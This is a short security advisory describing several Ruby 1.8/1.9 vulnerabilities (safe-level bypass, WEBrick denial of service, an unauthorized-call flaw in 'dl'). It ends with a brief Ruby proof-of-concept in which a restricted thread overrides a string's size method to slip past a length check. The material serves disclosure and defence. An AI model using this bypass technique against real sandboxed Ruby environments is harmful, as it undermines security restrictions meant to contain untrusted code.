source: http://www.securityfocus.com/bid/30644/info
  
Ruby is prone to multiple vulnerabilities that can be leveraged to bypass security restrictions or cause a denial of service:
  
- Multiple security-bypass vulnerabilities occur because of errors in the 'safe level' restriction implementation. Attackers can leverage these issues to make insecure function calls and perform 'Syslog' operations.
  
- An error affecting 'WEBrick::HHTP::DefaultFileHandler' can exhaust system resources and deny service to legitimate users.
  
- A flaw in 'dl' can allow attackers to call unauthorized functions.
  
Attackers can exploit these issues to perform unauthorized actions on affected applications. This may aid in compromising the application and possibly the underlying computers. Attackers can also cause denial-of-service conditions.
  
These issues affect Ruby 1.8.5, 1.8.6-p286, 1.8.7-p71, and 1.9 r18423. Prior versions are also vulnerable. 

class Hello
 def world
   Thread.new do
     $SAFE = 4
     msg = "Hello, World!"
     def msg.size
       self.replace self*10 # replace string
       1 # return wrong size
     end
     msg
   end.value
 end
end

$SAFE = 1 # or 2, or 3
s = Hello.new.world
if s.kind_of?(String)
 puts s if s.size < 20 # print string which size is less than 20
end